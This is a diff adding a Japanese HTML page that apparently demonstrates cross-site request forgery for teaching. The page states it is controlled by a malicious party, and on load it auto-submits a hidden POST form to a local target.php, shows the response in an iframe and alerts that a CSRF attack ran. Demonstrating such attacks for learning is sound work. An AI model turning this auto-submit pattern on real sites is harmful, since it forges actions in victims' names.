@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>csrf体験</title>
+
+<style>
+* {
+	color: red;
+}
+
+body {
+	background-color: black;
+}
+</style>
+<script>
+var send = function () {
+	var form = document.getElementById('form');
+	form.submit();
+
+	alert('csrfによる攻撃を実行しました。');
+}
+</script>
+</head>
+<body onload="send()">
+	<h1>csrf体験</h1>
+	<p>
+		このページは悪意ある人物が管理しているページです。
+		<br>読み込みが完了すると、target.phpに対してpost送信を試みます。
+	</p>
+	<form id="form" method="post" target="csrf"
+		action="./target.php">
+		<input type="hidden" name="var" value="csrf test">
+	</form>
+
+	<div><span style="color: white;">iframeで表示しています。</span></div>
+	<div><a href="./target.php" style="color: white;">攻撃対象のページを開く</a></div>
+	<iframe name="csrf" style="width: 80%; height: 70vh"></iframe>
+</body>
+</html>
